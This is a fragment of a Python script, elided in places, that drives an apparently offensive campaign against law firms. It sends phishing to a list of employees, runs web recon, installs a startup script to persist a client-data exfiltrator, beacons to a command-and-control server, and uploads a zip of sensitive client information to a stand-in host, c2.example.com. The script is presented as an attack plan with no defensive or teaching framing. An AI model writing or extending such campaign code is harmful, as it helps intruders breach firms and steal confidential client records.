...
def main():
    """
    Main function to run the law_firm_campaign campaign.
    """
    print(f"[*] Starting law_firm_campaign campaign...")

    # 1. Initial Access
    print("[*] Phase 1: Initial Access")
    initial_access.phishing_attack("law_firms_employees.txt")
    run_tool("apt_web_recon.js", "--target law_firms.com")


    # 2. Persistence
    print("\n[*] Phase 2: Persistence")
    persistence.add_startup_script("payloads/sensitive_client_information_exfiltrator.py")
    ...
    command_control.send_beacon(c2_server, "VICTIM-LAW_FIRMS-01")
    ...
    exfiltration.exfiltrate_data("sensitive_client_information/sensitive_client_information.zip", "https://c2.example.com/upload")
    run_tool("payloads/sensitive_client_information_exfiltrator.py")
